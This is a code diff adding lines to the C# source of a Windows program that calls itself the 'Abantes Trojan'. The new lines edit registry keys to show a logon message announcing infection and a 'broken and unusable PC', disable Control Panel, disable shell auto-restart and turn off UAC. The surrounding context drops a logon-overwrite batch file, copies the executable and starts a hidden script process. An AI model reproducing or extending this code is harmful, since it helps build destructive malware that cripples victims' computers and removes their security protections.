@@ -31,6 +31,22 @@ namespace Abantes
                 File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("legalnoticecaption", "Important Information");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Now Enjoy Your Broken and Unusable PC");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoControlPanel", "1");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\WindowsNT\CurrentVersion\Winlogon");
+                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+                editKey.Close();
+
                 Process ScriptProcess = new Process();
                 ScriptProcess.StartInfo.UseShellExecute = false;
                 ScriptProcess.StartInfo.CreateNoWindow = true;
